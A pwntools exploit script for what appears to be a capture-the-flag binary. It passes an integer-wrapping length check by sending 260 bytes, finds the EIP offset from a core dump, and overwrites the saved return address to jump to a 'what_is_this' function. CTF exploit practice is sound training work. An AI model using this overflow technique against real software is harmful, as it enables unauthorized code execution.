from pwn import *

# Set the context for 32-bit little endian architecture
context(os='linux', arch='i386', log_level='debug')

# Path to the binary
binary = './pwn/integer/int-1/int1'

# Load the binary ELF
elf = ELF(binary)

# Address of the 'what_is_this' function
what_is_this = elf.symbols['what_is_this']
log.info("Address of 'what_is_this': " + hex(what_is_this))

# Function to start the process
def start():
    return process(binary)

# Start the process
p = start()
p.recvuntil(b'Your choice:')
p.sendline(b'1')
# Send the username
p.recvuntil(b"Please input your username:\n")
p.sendline(b"user")

# Receive the greeting and prompt for password
p.recvuntil(b"Please input your passwd:\n")

# Generate a cyclic pattern to find the offset
payload_length = 260  # So that (260 % 256) = 4, passing the length check
payload = cyclic(payload_length)

# Send the password payload
p.send(payload)

# Wait for the process to crash
p.wait()

# Open the core dump
core = p.corefile

# Find the offset to EIP (saved return address)
eip_offset = cyclic_find(core.pc)
log.info("Offset to EIP: " + str(eip_offset))

# Craft the final payload
payload = b'A' * eip_offset
payload += p32(what_is_this)
payload = payload.ljust(payload_length, b'B')  # Pad to 260 bytes

# Restart the process
p = start()
p.recvuntil(b'Your choice:')
p.sendline(b'1')
# Send the username again
p.recvuntil(b"Please input your username:\n")
p.sendline(b"user")

# Receive the prompt for password
p.recvuntil(b"Please input your passwd:\n")

# Send the crafted payload
p.send(payload)

# Interact with the process to get the flag
p.interactive()